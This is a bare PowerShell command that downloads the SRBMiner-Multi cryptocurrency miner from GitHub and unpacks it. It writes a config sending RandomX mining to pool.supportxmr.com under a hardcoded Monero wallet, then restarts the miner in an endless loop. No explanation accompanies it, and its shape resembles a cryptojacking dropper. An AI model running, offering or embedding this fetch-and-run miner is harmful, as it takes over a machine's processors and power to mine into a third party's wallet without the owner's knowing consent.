powershell -Command "
Invoke-WebRequest -Uri 'https://github.com/doktor83/SRBMiner-Multi/releases/download/2.9.4/SRBMiner-Multi-2-9-4-win64.zip' -OutFile 'srbminer.zip';
Expand-Archive -Path 'srbminer.zip' -DestinationPath '.';
\$folder = Get-ChildItem -Directory | Where-Object { \$_.Name -like 'SRBMiner-Multi*' } | Select-Object -First 1;
Set-Location \$folder.FullName;
@'
{
  \"algorithm\": \"randomx\",
  \"pool\": \"pool.supportxmr.com:443\",
  \"wallet\": \"45WvRSeZuor9BbKMZF6s1VVvQriMjvScBbRLxoMTGe9c2J8Xnx4HySRHLLeTb8zf9944GD1uEmnpgUFFRHhJ7abSJXrmezb\",
  \"password\": \"x\",
  \"worker\": \"srb-cpu-gpu\",
  \"gpu_conf\": \"auto\",
  \"tls\": true
}
'@ | Out-File 'start_config.json' -Encoding ascii;
while (\$true) {
  Start-Process .\\SRBMiner-MULTI.exe -ArgumentList '--config start_config.json --logfile miner.log' -Wait;
  Start-Sleep -Seconds 10;
}
"
